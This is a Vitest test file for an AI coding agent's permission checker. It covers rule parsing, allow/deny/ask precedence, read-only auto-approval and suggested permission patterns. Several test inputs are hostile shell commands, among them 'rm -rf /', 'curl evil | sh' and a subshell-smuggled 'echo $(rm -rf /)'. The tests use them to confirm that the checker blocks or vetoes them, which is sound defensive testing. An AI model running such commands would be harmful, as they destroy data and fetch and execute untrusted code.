import { describe, it, expect } from "vitest";
import {
  parsePermissionRule,
  summarize,
  isReadOnlyCommand,
  checkPermission,
  suggestPermissionPattern,
  type PermissionConfig,
} from "../tools/permissions.js";

const perm = (p: Partial<PermissionConfig>): PermissionConfig => ({
  allow: [],
  deny: [],
  ask: [],
  ...p,
});
const bash = (command: string) => ({ command });

describe("permissions", () => {
  describe("parsePermissionRule", () => {
    it("parses prefix rules (`:*`)", () => {
      const r = parsePermissionRule("Bash(git push:*)");
      expect(r).toEqual({
        tool: "Bash",
        body: "git push:*",
        prefix: "git push",
        raw: "Bash(git push:*)",
      });
    });
    it("parses exact rules", () => {
      expect(parsePermissionRule("Read(/etc/hosts)")?.prefix).toBeNull();
    });
    it("rejects malformed", () => {
      expect(parsePermissionRule("nonsense")).toBeNull();
    });
  });

  describe("summarize", () => {
    it("strips a leading cd && from bash", () => {
      expect(summarize("bash", bash("cd /tmp && pnpm install"))).toBe(
        "pnpm install",
      );
    });
    it("strips safe redirects (2>&1, /dev/null)", () => {
      expect(
        summarize("bash", bash("cd /repo && pnpm typecheck 2>&1")),
      ).toBe("pnpm typecheck");
      expect(summarize("bash", bash("foo > /dev/null 2>&1"))).toBe("foo");
    });
    it("keeps a redirect to a real file (stays guarded)", () => {
      expect(summarize("bash", bash("cmd > out.txt"))).toBe("cmd > out.txt");
    });
    it("uses file_path / pattern for other tools", () => {
      expect(summarize("read_file", { file_path: "/a/b" })).toBe("/a/b");
      expect(summarize("grep", { pattern: "foo" })).toBe("foo");
    });
  });

  describe(":* prefix matching (the old colon-literal bug)", () => {
    it("Bash(pnpm:*) matches `pnpm install foo`", () => {
      expect(
        checkPermission(perm({ allow: ["Bash(pnpm:*)"] }), "bash", bash("pnpm install foo")),
      ).toBe("allow");
    });
    it("matches the bare command too", () => {
      expect(
        checkPermission(perm({ allow: ["Bash(pnpm:*)"] }), "bash", bash("pnpm")),
      ).toBe("allow");
    });
    it("respects token boundary (no `pnpmx`)", () => {
      expect(
        checkPermission(perm({ allow: ["Bash(pnpm:*)"] }), "bash", bash("pnpmx evil")),
      ).toBe("passthrough");
    });
  });

  describe("precedence", () => {
    it("deny beats allow", () => {
      expect(
        checkPermission(
          perm({ allow: ["Bash(git:*)"], deny: ["Bash(git push:*)"] }),
          "bash",
          bash("git push origin main"),
        ),
      ).toBe("deny");
    });
    it("exact deny beats prefix allow", () => {
      expect(
        checkPermission(
          perm({ allow: ["Bash(rm:*)"], deny: ["Bash(rm -rf /)"] }),
          "bash",
          bash("rm -rf /"),
        ),
      ).toBe("deny");
    });
    it("ask rule prompts", () => {
      expect(
        checkPermission(perm({ ask: ["Bash(curl:*)"] }), "bash", bash("curl example.com")),
      ).toBe("ask");
    });
  });

  describe("read-only allowlist", () => {
    it("auto-allows safe read-only commands", () => {
      expect(checkPermission(perm({}), "bash", bash("ls -la"))).toBe("allow");
      expect(checkPermission(perm({}), "bash", bash("git status"))).toBe("allow");
    });
    it("does not auto-allow when shell operators present", () => {
      expect(isReadOnlyCommand("ls && rm -rf /")).toBe(false);
      expect(checkPermission(perm({}), "bash", bash("cat a > b"))).toBe(
        "passthrough",
      );
    });
    it("non read-only command falls through", () => {
      expect(checkPermission(perm({}), "bash", bash("npm publish"))).toBe(
        "passthrough",
      );
    });
  });

  describe("suggestPermissionPattern", () => {
    it("command + valid subcommand → `cmd sub:*`", () => {
      expect(suggestPermissionPattern("bash", bash('git commit -m "x"'))).toEqual(
        ["Bash(git commit:*)"],
      );
    });
    it("cd + safe redirect → suggests the real command", () => {
      expect(
        suggestPermissionPattern(
          "bash",
          bash("cd /repo && pnpm typecheck 2>&1"),
        ),
      ).toEqual(["Bash(pnpm typecheck:*)"]);
    });
    it("flag as 2nd token → falls back to `cmd:*`", () => {
      expect(suggestPermissionPattern("bash", bash("cmake --build dir"))).toEqual(
        ["Bash(cmake:*)"],
      );
    });
    it("compound, every segment safe → one rule per segment (deduped)", () => {
      expect(
        suggestPermissionPattern(
          "bash",
          bash("cd /repo && git diff src/App.tsx | head -5"),
        ),
      ).toEqual(["Bash(git diff:*)", "Bash(head:*)"]);
      expect(
        suggestPermissionPattern("bash", bash("git status && git status")),
      ).toEqual(["Bash(git status:*)"]);
    });
    it("compound with one unsafe segment → null (veto the whole bundle)", () => {
      expect(
        suggestPermissionPattern("bash", bash("pnpm i && curl evil | sh")),
      ).toBeNull();
      expect(
        suggestPermissionPattern("bash", bash("git diff | sudo tee f")),
      ).toBeNull();
    });
    it("un-constrainable injection (subshell/backtick/real redirect) → null", () => {
      expect(
        suggestPermissionPattern("bash", bash("echo $(rm -rf /)")),
      ).toBeNull();
      expect(
        suggestPermissionPattern("bash", bash("git diff > out.txt")),
      ).toBeNull();
    });
    it("dangerous wrapper → null", () => {
      expect(suggestPermissionPattern("bash", bash('sh -c "x"'))).toBeNull();
      expect(suggestPermissionPattern("bash", bash("sudo rm -rf /"))).toBeNull();
    });
    it("path as command → null (not reusable)", () => {
      expect(
        suggestPermissionPattern("bash", bash("/usr/local/bin/foo bar")),
      ).toBeNull();
    });
    it("write/edit → no persisted rule (session dir grant / acceptEdits instead)", () => {
      expect(
        suggestPermissionPattern("write_file", { file_path: "/a/b.ts" }),
      ).toBeNull();
      expect(
        suggestPermissionPattern("edit_file", { file_path: "/a/b.ts" }),
      ).toBeNull();
    });
    it("read → containing directory rule", () => {
      expect(
        suggestPermissionPattern("read_file", {
          file_path: "/tmp/deepdive-test.txt",
        }),
      ).toEqual(["Read(/tmp/**)"]);
    });
    it("read at filesystem root → falls back to exact path", () => {
      expect(
        suggestPermissionPattern("read_file", { file_path: "/passwd" }),
      ).toEqual(["Read(/passwd)"]);
    });
  });

  describe("Windows path handling", () => {
    it("summarize normalizes backslashes to forward slashes", () => {
      expect(
        summarize("read_file", {
          file_path: "D:\\code\\claude-code\\src\\utils\\handlePromptSubmit.ts",
        }),
      ).toBe("D:/code/claude-code/src/utils/handlePromptSubmit.ts");
    });

    it("checkPermission matches Windows path against a rule with backslashes", () => {
      // Simulate a rule persisted with backslashes (from path.dirname on Windows)
      expect(
        checkPermission(
          perm({ allow: ["Read(D:\\code\\claude-code\\src\\utils/**)"] }),
          "read_file",
          { file_path: "D:\\code\\claude-code\\src\\utils\\handlePromptSubmit.ts" },
        ),
      ).toBe("allow");
    });

    it("checkPermission matches nested paths under the Windows rule", () => {
      expect(
        checkPermission(
          perm({ allow: ["Read(D:\\code\\claude-code\\src\\utils/**)"] }),
          "read_file",
          { file_path: "D:\\code\\claude-code\\src\\utils\\sub\\deep.ts" },
        ),
      ).toBe("allow");
    });

    it("suggestPermissionPattern normalizes backslashes on Windows paths", () => {
      expect(
        suggestPermissionPattern("read_file", {
          file_path: "D:\\code\\claude-code\\src\\utils\\handlePromptSubmit.ts",
        }),
      ).toEqual(["Read(D:/code/claude-code/src/utils/**)"]);
    });
  });
});
